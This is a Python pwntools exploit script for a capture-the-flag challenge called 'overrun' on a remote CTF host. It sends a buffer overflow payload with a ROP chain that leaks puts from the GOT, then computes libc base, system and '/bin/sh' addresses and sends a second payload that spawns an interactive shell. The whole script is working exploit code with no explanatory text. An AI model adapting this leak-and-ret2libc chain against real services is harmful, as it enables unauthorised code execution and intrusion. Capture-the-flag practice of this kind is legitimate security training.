from pwn import *
context.log_level = 'debug'
TARGET = './overrun'
HOST = 'overrun.problem.cpctf.space'
PORT = 3331

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
set disable-randomization on
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('name...')

payload = ''
# payload += 'A' * 112
# payload += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8A"
payload += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAi"

payload += p32(elf.sym['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
r.sendline(payload)

leak = r.recvuntil('name...')
leak = leak.split('\n')[-2]
leak = u32(leak)
dbg("leak")

# @local
# base = leak - 0x67b40 
# system = base + 0x3d200
# binsh = base + 0x17e0cf

# @compe
base = leak - 0x69a10 
system = base + 0x3e8ff
binsh = base + 0x17faaa

dbg("base")

payload = ''
# payload += 'A' * 112
payload += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAi"
payload += p32(system)
payload += p32(elf.sym['main'])
payload += p32(binsh)

r.sendline(payload)
r.interactive()
r.close()
